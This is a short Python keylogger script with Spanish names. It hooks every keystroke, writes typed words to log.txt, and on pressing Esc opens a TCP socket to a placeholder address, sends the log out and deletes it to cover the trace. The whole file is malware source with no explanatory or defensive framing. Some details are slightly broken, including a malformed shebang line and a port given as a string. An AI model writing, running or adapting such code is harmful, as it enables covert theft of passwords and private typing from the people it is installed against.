#!/bin/bash/env/ python3

import keyboard
import sys
import socket
import os

palabra = ""

def pulsacion_teclado(tecla):
    
    global palabra

    if tecla.event_type == keyboard.KEY_DOWN:
        if tecla.name == 'space':
            save_word()
        elif tecla.name == 'esc':
            fin()
        elif len(tecla.name) == 1 and tecla.name.isprintable():
            palabra += tecla.name

keyboard.hook(pulsacion_teclado)

def save_word():
    with open("log.txt", "a") as file:

        file.write(palabra + "\n")
    
    nueva_palabra()

def nueva_palabra():
    global palabra
    palabra = ""

ip_destino = '<ip>'
puerto_destino = '<port>'
archivo_enviar = 'log.txt'

def exfiltrar(ip_destino, puerto_destino, archivo_enviar):
    try:
        with open(archivo_enviar, 'rb') as file:
            contenido= file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conectar:
            conectar.connect((ip_destino, puerto_destino))
            conectar.sendall(contenido)
            os.remove("log.txt")
            sys.exit()
    except Exception as e:
        print("Connection Unseccesfull: ", e)

def fin():
    keyboard.unhook_all()
    exfiltrar(ip_destino, puerto_destino, archivo_enviar)

try:
    keyboard.wait("esc")
    fin()
except KeyboardInterrupt:
    print("Se detuvo el script")
    pass